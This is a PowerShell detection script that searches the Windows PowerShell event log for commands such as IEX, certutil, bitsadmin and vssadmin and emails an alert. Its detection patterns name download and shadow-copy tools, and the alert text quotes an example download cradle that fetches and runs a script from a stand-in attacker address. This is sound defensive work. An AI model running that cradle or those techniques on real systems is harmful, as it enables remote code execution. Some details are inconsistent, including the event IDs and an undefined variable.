<#
.NAME Get-DubiousPowerShellCommand

.SYNOPSIS
    There is no silver bullet for this. I suggest watching https://www.youtube.com/watch?v=x97ejtv56xw to become more familiar with
    different powershell code obfuscations. Make sure you are logging. I have turned my back on this script though feel free to build
    on this if you have better ideas.

    This is best used as a scheduled task that runs every 15 minutes. It checks the event log for maliciously used powershell commands
    Servers require more protections than everyday desktops. That is what this is meant for.

.DESCRIPTION
    This will require powershell command logging in the windows event log. We need Event ID 300
    This will send an email alert whenever a possibly malicous command is executed. Best used as a task on servers.
    A malicious command is defined as involving IEX, bitsadmin, certutil -f, and Start-BitsTransfer
    Vssadmin was added as well to discover if an admin attacker is trying to shadow clone password hashes

.SYNTAX
    Get-DubiousPowerShellCommand

.NOTES
    Author: Rob Osborne
    Alias: tobor
    Contact: rosborne@osbornepro.commands


.LINK
https://osbornepro.com
https://writeups.osbornepro.com
https://github.com/tobor88
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286


.EXAMPLE
    Get-DubiousPowerShellCommand -To alert@osbornepro.com -From alerter@osbornepro.com -SmtpServer mail.smtp2go.com -Verbose
    The above example sends an email to alert@osbornepro.com from alerter@osbornepro.com using SMTP2GO's smtp server if a malicious command is found.
#>
Function Get-DubiousPowerShellCommand {
    [CmdletBinding()]
        param(
            [Parameter(Mandatory=$True,
                Position=0,
                ValueFromPipeLine=$True,
                ValueFromPipeLineByPropertyName=$True,
                HelpMessage="Enter the email address you want to send an alert email to if the print spooler service is down. Example: aler@osbornepro.com")]
            [System.Net.Mail.MailAddress]$To,

            [Parameter(Mandatory=$True,
                Position=1,
                ValueFromPipeLine=$True,
                ValueFromPipeLineByPropertyName=$True,
                HelpMessage="Enter the email address that will send the alert email. Example: aler@osbornepro.com")]
            [System.Net.Mail.MailAddress]$From,

            [Parameter(Mandatory=$True,
                Position=2,
                ValueFromPipeLine=$True,
                ValueFromPipeLineByPropertyName=$True,
                HelpMessage="Enter your SMTP Server to use for sending the email. Example: mail.smtp2go.com")]
            [String]$SmtpServer) # End param

    BEGIN
    {

        $Computer = $env:COMPUTERNAME

        Write-Verbose "Checking event log for malicious commands..."

        [array]$BadEvent = Get-WinEvent -FilterHashtable @{logname="Windows PowerShell"; id=800} -MaxEvents 100 | Where-Object { ($_.Message -like "*Pipeline execution details for command line: IEX*") `
                                -or ($_.Message -like "*Pipeline execution details for command line: cmd /c certutil") `
                                -or ($_.Message -like "*Pipeline execution details for command line: certutil") `
                                -or ($_.Message -like "*Pipeline execution details for command line: cmd /c bitsadmin*") `
                                -or ($_.Message -like "*Pipeline execution details for command line: bitsadmin*") `
                                -or ($_.Message -like "*Pipeline execution details for command line: Start-BitsTransfer*") `
                                -or ($_.Message -like "*Pipeline execution details for command line: cmd /c vssadmin*")  `
                                -or ($_.Message -like "*Pipeline execution details for command line: vssadmin*") `
                                -or ($_.Message -like "*Pipeline execution details for command line: Invoke-Expression*") `
                                -or ($_.Message -like "*Pipeline execution details for command line: Invoke-WebRequest*") `
                                -and ($_.Message -notlike "**Pipeline execution details for command line:*Get-WinEvent*" )
                                }  # End FilterHashTable


    } # End BEGIN

    PROCESS
    {

        If (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "IEX*") {$EventInfo = $BadEvent}
        Elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "Invoke-Expression*") {$EventInfo = $BadEvent}
        Elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "certutil*") {$EventInfo = $BadEvent}
        Elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "cmd /c certutil*") {$EventInfo = $BadEvent}
        Elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "bitsadmin*") {$EventInfo = $BadEvent}
        Elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "cmd /c bitsadmin*") {$EventInfo = $BadEvent}
        Elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "Start-BitsTransfer*") {$EventInfo = $BadEvent}
        Elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "vssadmin*") {$EventInfo = $BadEvent}
        Elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "cmd /c vssadmin*") {$EventInfo = $BadEvent}
        Elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty 'Value' | Out-String) -like "Invoke-WebRequest*") {$EventInfo = $BadEvent}
        Else { exit }

        If ($EventInfo -like $null)
        {

            Write-Host "No malicious commands have been found. Ending rest of script execution. " -ForegroundColor Green

            exit

        } # End If
        Else
        {

            Write-Host "A malicious command may have been found..." -ForegroundColor Red

        }  # End Else

        $More = $EventInfo.Properties.Item(0)

    } # End PROCESS
    END
    {
            $Css = @"
<style>
table {
    font-family: verdana,arial,sans-serif;
        font-size:11px;
        color:#333333;
        border-width: 1px;
        border-color: #666666;
        border-collapse: collapse;
}
th {
        border-width: 1px;
        padding: 8px;
        border-style: solid;
        border-color: #666666;
        background-color: #dedede;
}
td {
        border-width: 1px;
        padding: 8px;
        border-style: solid;
        border-color: #666666;
        background-color: #ffffff;
}
</style>
"@

            $TableInfo = $EventInfo | Select-Object -Property 'MachineName', 'Message'
            $PreContent = "<Title>PowerShell RCE Monitoring Alert: Watches for Malicious Commands</Title>"
            $NoteLine = "$(Get-Date -format 'MM/dd/yyyy HH:mm:ss')"
            $PostContent = "<br><p><font size='2'><i>$NoteLine</i></font>"

            $MailBody = $TableInfo | ConvertTo-Html -Head $Css -PostContent $PostContent -PreContent $PreContent -Body "If command is like 'IEX (New-Object net.webclient).downloadstring('http://10.0.0.1:8000/Something.ps1')'; an attacker is using a pyhton Simple HTTP Server to try to run commands on our network devices. The http site is the attackers machine. If the command uses bitsadmin or certutil -urlcache -split -f the attacker is trying to download files to the device." | Out-String
            $MailBody += "This is the command that was issued:    "
            $MailBody += $More.Value
            $MailBody += "`n`nCommands found in PowerShell History: `n`n$Check"

            Send-MailMessage -From $From -To $To -Subject "Possible PowerShell Attack on $Computer" -BodyAsHtml -Body $MailBody -SmtpServer $SmtpServer

    } # End END

} # End Function Get-DubiousPowerShellCommand

$To = <email@domain.com>
$From = <email@domain.com>
$SmtpServer = <smtp server>

Get-DubiousPowerShellCommand -To $To -From $From -SmtpServer $SmtpServer -Verbose
